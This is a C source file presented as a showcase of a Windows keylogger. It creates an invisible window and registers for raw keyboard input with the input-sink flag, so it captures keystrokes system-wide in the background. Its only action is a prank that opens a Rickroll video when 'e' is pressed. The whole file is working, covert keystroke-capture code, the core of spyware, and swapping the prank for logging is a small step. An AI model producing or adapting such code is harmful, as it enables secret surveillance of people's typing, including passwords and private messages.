
/*
 * Technical showcase of a keylogger using win32 windows and raw input
 * it is a way better solution that doing a while GetAsyncKeyState because it does not use an entire cpu core
 * even if you add a Sleep() in the loop, it still uses a bit of your cpu
 * with this technic, it only trigger the callback when a key is pressed
 * 
 * the linker flag subsystem need to be window
*/


#ifndef _WIN32
#error Windows 32/64 only
#endif

#include <stdlib.h>
#include <windows.h>

/*
 * Window Callback
*/
LRESULT WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
    case WM_INPUT:
    {
        UINT dwSize;

        GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
        LPBYTE lpb = malloc(sizeof(BYTE) * dwSize);
        if (lpb == NULL)
        {
            return 0;
        }

        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize)
        {
            free(lpb);
            break;
        }

        RAWINPUT* raw = (RAWINPUT*)lpb;

        if (raw->header.dwType == RIM_TYPEKEYBOARD && raw->data.keyboard.Message == WM_KEYDOWN)
        {
            UINT key = MapVirtualKeyA(raw->data.keyboard.VKey, MAPVK_VK_TO_CHAR);
            if (key == 'e' || key == 'E')
            {
                ShellExecute(0, 0, L"https://www.youtube.com/watch?v=dQw4w9WgXcQ", 0, 0, SW_SHOW);
            }
        }

        free(lpb);
        break;
    }
    default:
    {
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    }
}

/*
 * Entry point
*/
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
    /*
     * Create invisible window
    */
    WNDCLASSA wclass = { 0 };
    wclass.hInstance = hInstance;
    wclass.lpfnWndProc = WndProc;
    wclass.lpszClassName = "rick";

    if (!RegisterClassA(&wclass))
    {
        return 1;
    }

    HWND hwnd = CreateWindowA(wclass.lpszClassName, NULL, 0, 0, 0, 0, 0, 0, NULL, hInstance, NULL);
    if (!hwnd)
    {
        return 1;
    }

    /*
     * Register raw input 
    */
    RAWINPUTDEVICE rid = { 0 };
    rid.dwFlags = RIDEV_NOLEGACY | RIDEV_INPUTSINK;
    rid.hwndTarget = hwnd;
    rid.usUsagePage = 1;
    rid.usUsage = 6;

    if (!RegisterRawInputDevices(&rid, 1, sizeof(rid)))
    {
        return 1;
    }

    /*
     * Handle messages 
    */
    MSG msg = { 0 };

    while (GetMessage(&msg, hwnd, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}